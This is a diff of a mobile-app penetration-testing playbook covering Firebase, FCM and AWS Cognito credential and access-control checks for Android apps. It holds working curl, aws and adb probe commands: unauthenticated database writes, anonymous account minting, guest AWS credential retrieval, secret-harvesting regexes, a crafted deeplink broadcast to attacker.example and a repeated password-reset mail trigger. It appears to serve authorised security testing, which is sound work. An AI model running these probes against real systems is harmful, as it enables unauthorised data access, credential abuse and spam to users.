 - **Test:** AOSP's own security model rule ① states that all static code and data in an APK "is considered to be public… if an actor publishes the code, this is interpreted as implicit consent to access". So presence is never the finding. Run this four-question test and write the answer into the report.
@@ -452,9 +491,9 @@ curl -s "https://fcm.googleapis.com/v1/projects/$P/messages:send?key=$K" -X POST
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (VARIES) for the storage framing |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies) for the storage framing |
 | **Attacker** | AM-01 |
-| **Applies to** | Apps with `firebase_database_url` in resources, or any `*.firebaseio.com` / `*.firebasedatabase.app` host in the package |
+| **Applies to** | Apps with `firebase_database_url` in resources, or any `*.firebaseio.com` / `*.firebasedatabase.app` host in the package — the string alone does not mean the app uses the store (D18-001 registrar check); probe anyway, report the consumer status |
 | **Requires** | firebase |
 | **Maps to** | MASTG-KNOW-0039 (Firebase Real-time Databases), MASWE-0004, CWE-306; Firebase insecure-rules documentation (`".read": true, ".write": true`); ATT&CK T1481.002 (ATT&CK names Firebase directly as a C2 channel used by Mandrake, TERRACOTTA and VajraSpy S9006) |
 
@@ -493,7 +532,7 @@ curl -s "$DB/pt_$M.json"                       # read it back — this is the pr
 curl -s -X DELETE "$DB/pt_$M.json" -w '\nHTTP %{http_code}\n'   # clean up
 curl -s "$DB/pt_$M.json"                       # confirm removal
 ```
-  **Marker discipline:** the marker must be 8+ random alphanumerics with no English word and no protocol keyword — never `test`, `poc`, `pwn`, `evil`, `payload`. Before claiming the write landed, confirm the marker does not already occur in the baseline read.
+  Marker discipline per D18-070 (8+ random alphanumerics, no English word, no protocol keyword; absent from the baseline read before a write claim).
 - **Proof:** The written value returned by an independent `GET`, plus the `DELETE` and the confirming empty read. A `200` on the `PUT` alone is not proof — Firebase returns the written payload on success, but a proxy or CDN can also return 200 for a discarded write.
 - **Escalation:** A writable node that the app *reads and renders* is content injection into every install -> D10 WebView / -> D17 dynamic loading. A writable feature-flag or config collection changes app behaviour for every user -> D18-025.
 - **Ruled out when:** The `PUT` returns `{"error":"Permission denied"}` on the root and on at least three representative child paths (`/users`, `/config`, and one path name recovered from the dex), and the read-back is empty. A single root-level denial is not enough: RTDB rules cascade downwards from a granting parent but a *denying* parent does not revoke a granting child path, so test child paths explicitly.
@@ -513,7 +552,7 @@ curl -s "$DB/pt_$M.json"                       # confirm removal
 - **How:**
 ```bash
 # harvest the paths the app itself addresses
-grep -rnE 'getReference\(|child\(|DatabaseReference|FirebaseDatabase\.getInstance' out/sources/ \
+grep -rnE 'getReference\(|child\(|DatabaseReference|FirebaseDatabase\.getInstance' $S/ \
   | grep -oE '"[A-Za-z0-9_/-]{2,40}"' | tr -d '"' | sort -u > rtdb_paths.txt
 wc -l rtdb_paths.txt
 # sweep them in Python, not a shell array loop, and count the results
@@ -552,10 +591,12 @@ PY
 - **How:**
 ```bash
 P=<project_id>; K=<google_api_key>
-# list root collections
-curl -s "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents?key=$K" | head -c 600
+# the only unauthenticated "is there a Firestore" probe: JSON PERMISSION_DENIED = database exists, rules in force;
+# JSON NOT_FOUND "does not exist" = no database; an HTML body = your probe is malformed (a GET on …/documents is not a Firestore route)
+curl -s -X POST "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents:listCollectionIds?key=$K" \
+  -H 'Content-Type: application/json' -d '{}' | jq -c '.collectionIds // .error'
 # a named collection (harvest names from the dex first)
-grep -rnE 'collection\("|collectionGroup\("|FirebaseFirestore' out/sources/ | grep -oE '"[A-Za-z0-9_-]{2,40}"' | sort -u
+grep -rnE 'collection\("|collectionGroup\("|FirebaseFirestore' $S/ | grep -oE '"[A-Za-z0-9_-]{2,40}"' | sort -u
 curl -s "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents/users?key=$K" | head -c 600
 # structured query, which some rule sets allow where the plain list is denied
 curl -s -X POST "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents:runQuery?key=$K" \
@@ -564,7 +605,7 @@ curl -s -X POST "https://firestore.googleapis.com/v1/projects/$P/databases/(defa
 ```
 - **Proof:** Document bodies returned with no `Authorization` header. Include the document count and field names; mask the values.
 - **Escalation:** -> D20; combine with D18-019 if the plain read is denied but an authenticated read is not.
-- **Ruled out when:** Both the `documents` listing and `:runQuery` return `PERMISSION_DENIED` for every collection name harvested from the app's source, *and* the same is true after obtaining an identity per D18-020. A denial without the authenticated retest is an incomplete negative — the `request.auth != null` case (D18-019) is the common one.
+- **Ruled out when:** Only a JSON `PERMISSION_DENIED` body counts; an HTML body or a JSON `NOT_FOUND` is a different state (malformed probe / no database) and is recorded as such. Both `documents:listCollectionIds` and `:runQuery` return `PERMISSION_DENIED` for every collection name harvested from the app's source, *and* the same is true after obtaining an identity per D18-020. A denial without the authenticated retest is an incomplete negative — the `request.auth != null` case (D18-019) is the common one.
 
 ### D18-018 · Firestore: unauthenticated document creation and patch
 
@@ -634,25 +675,25 @@ curl -s "https://<project>-default-rtdb.firebaseio.com/users.json?auth=$ID_TOKEN
 | **Requires** | firebase |
 | **Maps to** | Firebase insecure-rules documentation (the `request.auth != null` case); API2:2023 |
 
-- **Test:** If Anonymous auth or open email/password sign-up is enabled on the project, you can mint a project identity yourself with nothing but the API key from the APK. The "authenticated-only" rule then protects nothing.
+- **Test:** If Anonymous auth or open email/password sign-up is enabled on the project, you can mint a project identity yourself with nothing but the API key from the APK. The "authenticated-only" rule then protects nothing. Minting an identity creates a record in the target's production Identity Platform. It is a mutating probe: read-only signal first, mutating probe only under the programme's own-test-account permission (several programmes and every vendor-owned project require explicit approval — write `blocked` otherwise), cleanup always.
 - **How:**
 ```bash
 K=<google_api_key>
-# anonymous
-curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$K" \
-  -H 'Content-Type: application/json' -d '{"returnSecureToken":true}' | jq '{localId, idToken: (.idToken|.[0:24]+"…"), expiresIn}'
-# email/password
-curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$K" \
-  -H 'Content-Type: application/json' \
-  -d '{"email":"you+fb1@example.com","password":"Passw0rd!123","returnSecureToken":true}' | jq '{localId, error: .error.message}'
-# custom-token / provider list for the project
-curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$K" \
-  -H 'Content-Type: application/json' \
-  -d '{"identifier":"you+fb1@example.com","continueUri":"http://localhost"}' | jq '{registered, allProviders, signinMethods}'
+# 1) read-only: enabled providers — createAuthUri creates nothing
+curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$K" -H 'Content-Type: application/json' \
+  -d '{"identifier":"probe@example.com","continueUri":"http://localhost"}' | jq '{registered, allProviders, signinMethods, error: .error.message}'
+# 2) mutating — only with permission; a WELL-FORMED address on a domain you control (a malformed one returns INVALID_EMAIL before the provider check and proves nothing)
+curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$K" -H 'Content-Type: application/json' \
+  -d '{"returnSecureToken":true}' | jq '{localId, idToken: (.idToken|.[0:24]+"…"), error: .error.message}'                       # anonymous
+curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$K" -H 'Content-Type: application/json' \
+  -d '{"email":"you+fb1@yourdomain.example","password":"Passw0rd!123","returnSecureToken":true}' | jq '{localId, error: .error.message}'
+# 3) cleanup — delete the identity you minted, with its own token
+curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:delete?key=$K" -H 'Content-Type: application/json' \
+  -d "{\"idToken\":\"$ID_TOKEN\"}" -w '\nHTTP %{http_code}\n'
 ```
 - **Proof:** An `idToken` in the response, then that token successfully reading a Firestore document or Storage object that belongs to a different `uid`. Both halves in one evidence block.
 - **Escalation:** Anonymous identities also satisfy any *write* rule gated on `request.auth != null` — test the write with the anonymous token, not only the read.
-- **Ruled out when:** `accounts:signUp` returns `ADMIN_ONLY_OPERATION` (sign-up disabled), `OPERATION_NOT_ALLOWED` (that provider is off) or the app-restriction error, and there is no other route to a project identity within scope. Record the exact error for each provider you tried.
+- **Ruled out when:** `accounts:signUp` returns `ADMIN_ONLY_OPERATION` (sign-up disabled), `OPERATION_NOT_ALLOWED` (that provider is off) or the app-restriction error, and there is no other route to a project identity within scope. Record the exact error for each provider you tried. `INVALID_EMAIL` is inconclusive, never a negative. When the brief forbids account creation, record `blocked` with createAuthUri's `allProviders` as the only read-only signal.
 
 ### D18-021 · Firebase Cloud Storage: bucket object listing
 
@@ -661,7 +702,7 @@ curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUr
 | **Severity ceiling** | Critical |
 | **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (VARIES — rate on demonstrated data); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-01 |
-| **Applies to** | Apps with `google_storage_bucket` in resources or any `firebasestorage.googleapis.com` reference |
+| **Applies to** | Apps with `google_storage_bucket` in resources or any `firebasestorage.googleapis.com` reference — the string alone does not mean the app uses the store (D18-001 registrar check); probe anyway, report the consumer status |
 | **Requires** | firebase |
 | **Maps to** | Firebase insecure Storage rules (`allow read, write;` → "any internet user can read or write to all files in the bucket"); MASWE-0004 |
 
@@ -685,7 +726,7 @@ curl -s -o /tmp/obj "https://firebasestorage.googleapis.com/v0/b/$B/o/$(python3 
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (VARIES); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for a targeted overwrite |
+| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for a targeted overwrite |
 | **Attacker** | AM-01 |
 | **Applies to** | Firebase Storage projects |
 | **Requires** | firebase |
@@ -726,14 +767,15 @@ curl -s -X POST \
   "https://firebaseremoteconfig.googleapis.com/v1/projects/$P/namespaces/firebase:fetch?key=$K" \
   -H 'Content-Type: application/json' \
   -d "{\"app_instance_id\":\"probe\",\"app_id\":\"$APPID\"}" | jq .
-# and the on-device cache, for the values the app actually received
-adb shell su 0 cat /data/data/<pkg>/shared_prefs/com.google.firebase.remoteconfig*.xml
-adb shell su 0 ls -l /data/data/<pkg>/files/ /data/data/<pkg>/databases/
-adb shell su 0 sqlite3 /data/data/<pkg>/databases/frc*.db '.tables' 2>/dev/null
+# the values the app holds (firebase-config >= 19 persists ConfigContainer JSON under files/): activate = in use, fetch = last fetched
+# (may be un-activated), defaults = in-app defaults. Run the glob INSIDE su: the uid-2000 shell cannot expand it
+adb shell "su 0 sh -c 'ls -l /data/data/<pkg>/files/ | grep frc_'"
+adb shell "su 0 sh -c 'cat /data/data/<pkg>/files/frc_*_firebase_activate.json'" | jq .
+adb shell "su 0 sh -c 'cat /data/data/<pkg>/files/frc_*_firebase_fetch.json'" | jq .
 ```
 - **Proof:** The fetched `entries` object, with any internal hostname, unreleased flag name or credential highlighted. Pair it with a follow-up request proving a leaked hostname is live.
 - **Escalation:** Leaked endpoints feed -> D15 directly and are frequently a staging API with weaker controls (see D18-068). A credential in a value goes back through D18-013.
-- **Ruled out when:** The fetch returns `NO_TEMPLATE` / an empty `entries`, or the project uses no Remote Config (no `FirebaseRemoteConfig` reference in the dex and no `frc*.db`). Note that a per-cohort condition may hide values from your default fetch — D18-026 must also be negative before you record this as ruled out.
+- **Ruled out when:** The fetch returns `NO_TEMPLATE` / an empty `entries`, or the project uses no Remote Config (no `…remoteconfig.RemoteConfigRegistrar` in the manifest registrar list of D18-001 and no `files/frc_*` on the device). Note that a per-cohort condition may hide values from your default fetch — D18-026 must also be negative before you record this as ruled out.
 
 ### D18-024 · Remote Config used as a secret store — read the values the device actually received
 
@@ -773,7 +815,7 @@ grep -niE 'secret|password|token|private|signing|hmac|salt' rc_entries.txt
 - **Test:** Find config values that gate security behaviour — API base URL, "enforce pinning", "require signature", a maximum transaction amount, a fraud threshold — then override them and observe the consequence. If the client obeys, whoever can influence or intercept the config controls the app.
 - **How:**
 ```bash
-grep -rn 'FirebaseRemoteConfig\|getString(\|getBoolean(\|getLong(\|getDouble(' out/sources/ \
+grep -rn 'FirebaseRemoteConfig\|getString(\|getBoolean(\|getLong(\|getDouble(' $S/ \
   | grep -iE 'url|host|endpoint|enable|require|pin|verify|cert|max|limit|threshold|fraud|debug'
 ```
 ```javascript
@@ -843,7 +885,7 @@ done
 - **How:**
 ```bash
 grep -rniE 'cloudfunctions\.net|lambda-url\.[a-z0-9-]+\.on\.aws|execute-api\.[a-z0-9-]+\.amazonaws\.com|\.run\.app|httpsCallable\(' \
-  out/sources/ out/res out/assets | sort -u
+  $S/ $R $A | sort -u
 FN=https://us-central1-<project>.cloudfunctions.net/<fn>
 # unauthenticated; callables take {"data": …} and return {"result": …}
 curl -s -i -X POST "$FN" -H 'Content-Type: application/json' -d '{"data":{}}' | head -20
@@ -861,7 +903,7 @@ curl -s -X POST "$FN" -H "Authorization: Bearer $ID_TOKEN" -H 'Content-Type: app
 | | |
 |---|---|
 | **Severity ceiling** | Medium |
-| **VRT** | `broken_access_control.username_enumeration.non_brute_force` (P4); the provider disclosure additionally enables `server_security_misconfiguration.oauth_misconfiguration.account_squatting` (P4) |
+| **VRT** | `broken_access_control.username_enumeration.non_brute_force` (P4); the provider disclosure additionally enables `server_security_misconfiguration.oauth_misconfiguration.account_squatting` (P4); `server_security_misconfiguration.no_rate_limiting_on_form.email_triggering` (P4) for the unthrottled mail trigger |
 | **Attacker** | AM-01 |
 | **Applies to** | Firebase Auth projects whose key is not application-restricted (D18-009) |
 | **Requires** | firebase |
@@ -879,7 +921,13 @@ curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPa
   -d '{"email":"you@example.com","password":"deliberately-wrong","returnSecureToken":true}' | jq -r '.error.message'
 ```
   Compare `EMAIL_NOT_FOUND` against `INVALID_PASSWORD`, and `registered: true` against `false`.
-- **Proof:** A stable differential between an address you own and a known-absent address, reproduced at least six times each, with the two response bodies. Enumerate only addresses you own.
+```bash
+# key-only MUTATING endpoint, own addresses only: branded mail to any address; count the mails — 6 interleaved sends with no TOO_MANY_ATTEMPTS_TRY_LATER = unthrottled
+for i in 1 2 3 4 5 6; do curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=$K" -H 'Content-Type: application/json' \
+  -d '{"requestType":"PASSWORD_RESET","email":"you@yourdomain.example","continueUrl":"https://<domain-you-control>/"}' | jq -c '{email, error: .error.message}'; done
+```
+  `INVALID_CONTINUE_URI` / `UNAUTHORIZED_DOMAIN` = the authorised-domains list is enforced (good); `email` echoed 6/6 with your domain accepted = a brandable phishing link plus a mail-bomb primitive.
+- **Proof:** A stable differential between an address you own and a known-absent address, reproduced at least six times each, with the two response bodies. Enumerate only addresses you own. For the mail trigger: the six response bodies and the received-mail headers.
 - **Escalation:** Provider disclosure -> targeted OAuth account-linking and squatting; combined with any unthrottled password endpoint it rises to High.
 - **Ruled out when:** The key is application-restricted (D18-009 negative), or both endpoints return the same response for existing and non-existing identifiers across the six-sample comparison. Compare response **bodies**, not status codes (D18-071).
 
@@ -898,7 +946,7 @@ curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPa
 - **How:**
 ```bash
 grep -rnE 'FirebaseAppCheck|installAppCheckProviderFactory|PlayIntegrityAppCheckProviderFactory|DebugAppCheckProviderFactory|SafetyNetAppCheckProviderFactory|firebase_app_check_debug_token' \
-  out/sources out/res
+  $S $R
 # is enforcement on?  a valid ID token, no App Check header
 curl -s -i -X POST "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents:runQuery" \
   -H "Authorization: Bearer $ID_TOKEN" -H 'Content-Type: application/json' \
@@ -936,32 +984,26 @@ curl -s -i -X OPTIONS "https://<project>.appspot.com/api/" \
 
 | | |
 |---|---|
-| **Severity ceiling** | High (Critical where push drives in-app navigation) |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
+| **Severity ceiling** | Low (P5 graveyard since the 2024 shutdown; the High/Critical ceiling of this class now lives in D18-032 and D18-074) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` (P5) — a key for an endpoint that no longer exists; rotation-hygiene note in the D18-032 report |
 | **Attacker** | AM-01 |
 | **Applies to** | FCM apps. **LEGACY:** the `Authorization: key=` server-key endpoint belongs to the legacy FCM HTTP API, superseded by the OAuth2/service-account HTTP v1 API — on a current project the modern equivalent is D18-032 |
 | **Requires** | firebase, push |
 | **Maps to** | Google ASI campaign "Exposed Firebase Cloud Messaging Server Keys" (started 2021-10-12, `support.google.com/faqs/topic/11015404`); H1 #789370 (Smule, Critical, CWE "Use of Hard-coded Credentials"); CWE-798 |
 
-- **Test:** The client needs only the **sender id**. A *server* key in the APK lets anyone send push notifications to the app's entire install base under the vendor's brand.
+- **Test:** The legacy HTTP/XMPP FCM API was deprecated on 2023-06-20 and shut down on 2024-07-22; an `AAAA…:APA91b…` server key no longer sends anything. Its remaining value: it proves the project once shipped a server credential, which makes D18-007's older-build sweep for a service-account JSON (D18-032) mandatory, and the key's presence is a rotation-hygiene note in the D18-032 report. The live mass-messaging credential classes are the service-account JSON (D18-032) and the push-vendor REST key (D18-074).
 - **How:**
 ```bash
-grep -rnE 'AAAA[A-Za-z0-9_-]{7}:APA91b[A-Za-z0-9_-]{100,}' out/ | sort -u
-grep -rnE 'AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}' out/ | sort -u
+grep -rnE 'AAAA[A-Za-z0-9_-]{7}:APA91b[A-Za-z0-9_-]{100,}' "$DEC" | sort -u
+grep -rnE 'AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}' "$DEC" | sort -u
 grep -rn 'server_key\|notification_server_key\|google_notification_key\|legacy_server_key' \
-  out/res/values/*.xml out/assets/ out/sources/ 2>/dev/null
-# validate WITHOUT touching real users: an obviously invalid registration id first
-curl -s -i -X POST https://fcm.googleapis.com/fcm/send \
-  -H "Authorization: key=$SERVER_KEY" -H 'Content-Type: application/json' \
-  -d '{"registration_ids":["ABC"]}' | head -5
-# then, only to a device token you own
-curl -s -X POST https://fcm.googleapis.com/fcm/send \
-  -H "Authorization: key=$SERVER_KEY" -H 'Content-Type: application/json' \
-  -d '{"to":"'"$MY_OWN_DEVICE_TOKEN"'","notification":{"title":"pentest","body":"own device only"}}'
+  $R/values/*.xml $A/ $S/ 2>/dev/null
+curl -s -o /dev/null -w '%{http_code}\n' -X POST https://fcm.googleapis.com/fcm/send \
+  -H "Authorization: key=$SERVER_KEY" -H 'Content-Type: application/json' -d '{"registration_ids":["ABC"]}'   # expect 404 for every key since the 2024 shutdown; anything else means the endpoint came back — re-read this item
 ```
-- **Proof:** HTTP 200 from `fcm.googleapis.com/fcm/send` with that key (a dead key returns 401), then `{"success":1,"failure":0}` and the notification visibly arriving on **your own** handset. **Never** send to `/topics/…`, never to `condition` expressions, never to `registration_ids` you did not generate. The corpus records the fleet-wide targeting form (`"!('<random>' in topics)"`, true for every device) — **report its existence, never execute it**.
-- **Escalation:** -> D24 mass phishing under the vendor's brand. Critical when the app's `FirebaseMessagingService` acts on message contents — a deep link, a config change, a silent action — because the key then becomes a remote-control channel (D18-034). Google's own remediation note applies: removing the key from the current build does not fix it, because it is still in an older version (D18-007).
-- **Ruled out when:** No `AAAA…:APA91b…`-shaped string anywhere in the package or in older builds, and any candidate found returns 401 from the legacy endpoint. A 401 on the legacy endpoint on a project that has disabled the legacy API is a null result **for the endpoint, not for the key's exposure** — say which you mean.
+- **Proof:** The grep hit with `file:line` and the 404; nothing more. Never send to `/topics/…`, `condition` expressions or `registration_ids` you did not generate on any endpoint that does answer — report the fleet-wide targeting form, never execute it.
+- **Escalation:** None for the legacy key itself. The push-as-remote-control chain (a `FirebaseMessagingService` that acts on message contents — D18-034) now starts from D18-032 (service-account JSON) or D18-074 (vendor REST key). Google's own remediation note still applies to those: removing the credential from the current build does not fix it, because it is still in an older version (D18-007).
+- **Ruled out when:** Trivially since the shutdown — record the 404 once per key found, and move the budget to D18-032 (service-account JSON in any build) and D18-074 (vendor push REST key).
 
 ### D18-032 · Google service-account JSON shipped in the package (the modern, worse equivalent)
 
@@ -977,7 +1019,7 @@ curl -s -X POST https://fcm.googleapis.com/fcm/send \
 - **Test:** With FCM HTTP v1 the send credential is an OAuth2 service account, not a server key. A service account typically grants far more than push — it is a GCP principal, and its role set decides the severity.
 - **How:**
 ```bash
-grep -rln '"type": *"service_account"' out/ 2>/dev/null
+grep -rln '"type": *"service_account"' "$DEC" 2>/dev/null
 unzip -l target.apk | grep -iE '\.json$' | grep -iE 'service|account|credential|firebase-adminsdk'
 # validate scope only — authenticate, describe, stop
 gcloud auth activate-service-account --key-file=svc.json
@@ -1005,14 +1047,12 @@ gcloud auth revoke --all
 - **Test:** `gcm_defaultSenderId` and `google_app_id` are client identifiers and belong in the package by design. Confusing one for a server key is, in the corpus's words, the fastest way to have the report downgraded. Before filing anything push-related, state which credential you hold and show the authentication result.
 - **How:**
 ```bash
-grep -n 'gcm_defaultSenderId\|google_app_id\|google_api_key' out/res/values/strings.xml
+grep -n 'gcm_defaultSenderId\|google_app_id\|google_api_key' $R/values/strings.xml
 # a sender id is numeric (e.g. 1234567890123); a server key is AAAA…:APA91b…; a v1 credential is a JSON file
-# prove the distinction in the report by showing the send attempt fail with only the sender id:
-curl -s -i -X POST https://fcm.googleapis.com/fcm/send \
-  -H "Authorization: key=<sender_id>" -H 'Content-Type: application/json' \
-  -d '{"registration_ids":["ABC"]}' | head -3
+# prove the distinction in the report on the v1 endpoint (the legacy /fcm/send endpoint answers 404 to everything since 2024-07-22):
+curl -s -X POST "https://fcm.googleapis.com/v1/projects/$P/messages:send" -H "Authorization: Bearer <sender_id>" -d '{}' | jq -r '.error.status'   # UNAUTHENTICATED = a client identifier, not a credential
 ```
-- **Proof:** The 401 from the sender-id attempt alongside the 200 from the real server key (if you have one). Where you only have the sender id, record it as a P5 graveyard row with that 401.
+- **Proof:** The `UNAUTHENTICATED` from the sender-id attempt on the v1 endpoint alongside the service-account result of D18-032 (if you have one). Where you only have the sender id, record it as a P5 graveyard row with that response.
 - **Escalation:** None on its own. Its value is preventing a bad filing and preserving credibility for the real findings in the same report.
 - **Ruled out when:** Trivially — this item is a calibration step, not a test. It is "done" when every push-related credential in the identity table carries an explicit kind (`sender_id` / `legacy_server_key` / `service_account`) and an authentication result.
 
@@ -1030,10 +1070,10 @@ curl -s -i -X POST https://fcm.googleapis.com/fcm/send \
 - **Test:** A stolen send credential is worth far more when the app *acts* on data messages: opens a deep link, loads a URL in a WebView, writes config, or triggers a silent action. Read the handler before rating D18-031/-032.
 - **How:**
 ```bash
-grep -rn 'FirebaseMessagingService\|onMessageReceived\|RemoteMessage\|getData()\|getNotification()' out/sources/
-grep -n -A8 'com.google.firebase.MESSAGING_EVENT' out/AndroidManifest.xml
+grep -rn 'FirebaseMessagingService\|onMessageReceived\|RemoteMessage\|getData()\|getNotification()' $S/
+grep -n -A8 'com.google.firebase.MESSAGING_EVENT' $MF
 # check the messaging service is guarded by the signature permission
-grep -n -B2 -A6 'com.google.android.c2dm.permission.SEND' out/AndroidManifest.xml
+grep -n -B2 -A6 'com.google.android.c2dm.permission.SEND' $MF
 # locally, try delivering a crafted message intent
 adb shell am broadcast -n <pkg>/<receiver> -a com.google.android.c2dm.intent.RECEIVE \
   --es 'deeplink' 'https://attacker.example/'
@@ -1050,14 +1090,15 @@ adb shell am broadcast -n <pkg>/<receiver> -a com.google.android.c2dm.intent.REC
 | **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1); `…overly_permissive_iam_roles` (P2) for the policy itself |
 | **Attacker** | AM-01 |
 | **Applies to** | All |
+| **Requires** | — |
 | **Maps to** | CWE-798; MASWE-0004; Cobalt "Mobile Vulnerabilities: Pen tester's guide" real-life example #1 (extracted AWS key with excessive IAM permissions, rated **Critical**) |
 
 - **Test:** An `AKIA…`/`ASIA…` key is only as severe as its IAM policy. Enumerate the policy; do not pivot into production.
 - **How:**
 ```bash
-grep -rhoE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' out/ | sort -u
-grep -rhoE 'aws_secret_access_key["[:space:]:=]+[A-Za-z0-9/+=]{40}' out/ | sort -u
-for so in out/lib/*/*.so; do strings -n 12 "$so" | grep -E 'AKIA[0-9A-Z]{16}'; done
+grep -rhoE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' "$DEC" | sort -u
+grep -rhoE 'aws_secret_access_key["[:space:]:=]+[A-Za-z0-9/+=]{40}' "$DEC" | sort -u
+for so in $L/*/*.so; do strings -n 12 "$so" | grep -E 'AKIA[0-9A-Z]{16}'; done
 export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=...
 aws sts get-caller-identity
 aws iam get-user 2>&1 | head -3
@@ -1077,17 +1118,20 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
 | **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1); `…overly_permissive_iam_roles` (P2) |
 | **Attacker** | AM-01 |
 | **Applies to** | AWS Amplify / Cognito-backed apps |
+| **Requires** | — |
 | **Maps to** | Amazon Cognito identity pools documentation — guest access "provides a unique identifier and AWS credentials for users who do not authenticate with an identity provider"; each identity type has an assigned IAM role whose policy "dictates which AWS services that role can access"; API8:2023 |
 
 - **Test:** An identity-pool id in the APK plus enabled guest access hands anyone temporary AWS credentials under the pool's *unauthenticated* IAM role. The pool id is not a secret; the role's policy is the finding.
 - **How:**
 ```bash
 grep -rniE 'us-[a-z]+-[0-9]:[0-9a-f-]{8}-[0-9a-f-]{4}-[0-9a-f-]{4}-[0-9a-f-]{4}-[0-9a-f]{12}|cognito-identity|identityPoolId|amplifyconfiguration|awsconfiguration' \
-  out/res out/assets out/sources | sort -u
+  $R $A $S | sort -u
 POOL=us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
 REGION=us-east-1
-ID=$(aws cognito-identity get-id --identity-pool-id "$POOL" --region $REGION --query IdentityId --output text)
-aws cognito-identity get-credentials-for-identity --identity-id "$ID" --region $REGION > creds.json
+unset AWS_PROFILE AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN   # the pool call must carry no identity of yours
+# both APIs are unauthenticated but the CLI still signs them: without --no-sign-request it fails 'Unable to locate credentials' (reads as guest disabled) or signs with YOUR account
+ID=$(aws cognito-identity get-id --identity-pool-id "$POOL" --region $REGION --query IdentityId --output text --no-sign-request)
+aws cognito-identity get-credentials-for-identity --identity-id "$ID" --region $REGION --no-sign-request > creds.json
 export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId creds.json)
 export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretKey creds.json)
 export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken creds.json)
@@ -1097,7 +1141,7 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 ```
 - **Proof:** `get-caller-identity` returning an assumed-role ARN that names the pool's *unauth* role, followed by **one** successful data operation that an anonymous internet user should not be able to perform. `get-caller-identity` also discloses the account id, which is itself worth recording.
 - **Escalation:** -> D18-039/-040 if the role reaches S3; -> D15 if it reaches an API Gateway with IAM auth. An over-broad *authenticated* role is the same finding one sign-up later — see D18-037.
-- **Ruled out when:** `get-id` returns `NotAuthorizedException` (guest access disabled), or the credentials resolve to a role whose every probed action returns `AccessDenied`. List the actions you probed; a negative on an unnamed action set is not a negative.
+- **Ruled out when:** `get-id` returns `NotAuthorizedException` **with `--no-sign-request` present in the command you paste** (guest access disabled), or the credentials resolve to a role whose every probed action returns `AccessDenied`. List the actions you probed; a negative on an unnamed action set is not a negative.
 
 ### D18-037 · Cognito *authenticated* role over-scope — one sign-up away
 
@@ -1114,9 +1158,10 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 - **How:**
 ```bash
 # sign up / sign in through the app, capture the Cognito id token from the proxy, then:
-ID=$(aws cognito-identity get-id --identity-pool-id "$POOL" --region $REGION \
+unset AWS_PROFILE AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN   # no identity of yours on the pool call
+ID=$(aws cognito-identity get-id --identity-pool-id "$POOL" --region $REGION --no-sign-request \
      --logins "cognito-idp.$REGION.amazonaws.com/$USERPOOL=$COGNITO_ID_TOKEN" --query IdentityId --output text)
-aws cognito-identity get-credentials-for-identity --identity-id "$ID" --region $REGION \
+aws cognito-identity get-credentials-for-identity --identity-id "$ID" --region $REGION --no-sign-request \
   --logins "cognito-idp.$REGION.amazonaws.com/$USERPOOL=$COGNITO_ID_TOKEN" > creds.json
 # then the same enumeration as D18-036, and specifically test whether the policy is scoped by identity
 aws s3 ls s3://<app-bucket>/ --recursive 2>&1 | head
@@ -1132,17 +1177,18 @@ aws s3 ls s3://<app-bucket>/private/ 2>&1 | head    # Amplify's per-identity pre
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
